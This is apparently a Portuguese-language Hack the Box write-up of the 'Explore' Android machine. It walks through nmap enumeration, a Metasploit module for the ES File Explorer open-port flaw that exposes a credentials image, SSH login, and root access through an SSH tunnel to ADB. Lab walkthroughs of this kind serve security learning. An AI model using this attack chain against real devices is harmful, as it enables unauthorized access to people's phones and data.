# Saudações, bem vindos!

### | Write-up by: no0n1 | "Explore" machine | 10.10.10.247 |

O projeto consiste em realizar as máquinas da plataforma Hack the Box, e criar o write-up em português para ajudar a comunidade nacional de hacking! 

Sinta-se livre para colaborar com o projeto.

//Não irei ensinar a conectar no servidor da máquina na plataforma da Hack the Box, mas saiba que é necessário baixar a vpn deles e se conectar, tem um guia no próprio site.

> "Use o conhecimento com sabedoria"

## ENUMERAÇÃO

Como de costume, começaremos um dos processos mais importantes do pentest, a fase de enumeração. Utilizaremos o nmap para isto, devido às suas diversas funcionalidades.	
Numa situação real, para não chamarmos muito a atenção, recomendo salvar o resultado do scan em um arquivo .txt, assim, caso precise relembrar alguma informação, não será necessário fazer outro request para o alvo.
		
![scan](https://user-images.githubusercontent.com/22158061/136661811-199f7f47-d458-4c3f-943a-a1e62fbcfc9c.png)

## EXPLORAÇÃO E EXPLOITATION

Após analisar as portas abertas e possíeis vulnerabilidades, abriremos o Metasploit.

```

 MSFCONSOLE
 use scanner/http/es_file_explorer_open_port
 set RHOSTS 10.10.10.247
 set action LISTPICS
 exploit

```
	
![images](https://user-images.githubusercontent.com/22158061/136662013-6e5cbaf4-5e14-4f9a-967a-bc3d7271c050.png)

Utilizaremos o scanner http do es file explorer, isto pq após pesquisar sobre as informações que coletamos na fase de enumeração, descobri que existe uma falha ai. Dentro deste módulo do Metasploit, é importante saber oq ele faz, vc consegue ver isso dando o comando ``` info ```.
Estimule a curiosidade, pesquise toda a informação que vc achar útil para o ataque. Mexa em tudo, vasculhe tudo. 
Teste todas as ações que o módulo permite, teste todas as possibilidas, foi assim que descobri algo curioso nas imagens.

```

Na barra de url do browser: 10.10.10.247:59777//storage/emulated/0/DCIM/creds.jpg

```

Conseguimos um possível login e senha.

Vamos tentar uma conexão ssh com esse login e senha.

```

 msf6 > ssh -p 2222 kristi@10.10.10.247

```

![whoami](https://user-images.githubusercontent.com/22158061/136662499-bece1d1f-191f-40e7-8534-5470e057a91b.png)

Conseguimos acesso! Hacked.

```

 ls
 cd /sdcard
 cat user.txt

```

![userFlag](https://user-images.githubusercontent.com/22158061/136662567-e32e8983-502e-4c8e-beba-1a335ce13f46.png)

Reforço a ideia de ser curioso e entrar e mexer em tudo, assim que descobri o arquivo com a flag. Primeira flag pega.

## ESCALANDO PREVILÉGIOS

```

 sudo apt-get install android-tools-adb 

```

ADB é uma ferramenta de comando de texto que nos permite comunicarmos com um aparelho, importante, já que é um android.

```

 ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555 

```

Em outra aba do terminal:

```

 adb connect localhost:5555

 adb shell	

```

![root](https://user-images.githubusercontent.com/22158061/136662752-7d4cf8ba-99e8-42f5-9790-5a76be5d6616.png)

Conseguimos mais uma vez! Acesso escalado. Pawned.

```

 find root.txt /* |grep "root.txt" 	

```

![findRootTxt](https://user-images.githubusercontent.com/22158061/136662892-038d1828-781e-4def-9e47-ac2382c7998c.png)

```

 cat /data/root.txt

```

![rootFlag](https://user-images.githubusercontent.com/22158061/136662908-77491602-4443-4f20-a143-89d3dca6832f.png)

Como geralmente a flag fica dentro de um arquivo root.txt, dei o comando para pesquisar onde estaria esse arquivo. Por sorte conseguimnos o caminho da segunda flag. 

## Obrigado por acompanhar, este é o primeiro. Pretendo continuar com outras máquinas e aumentando a dificuldade ao passar do tempo.

Até a próxima!


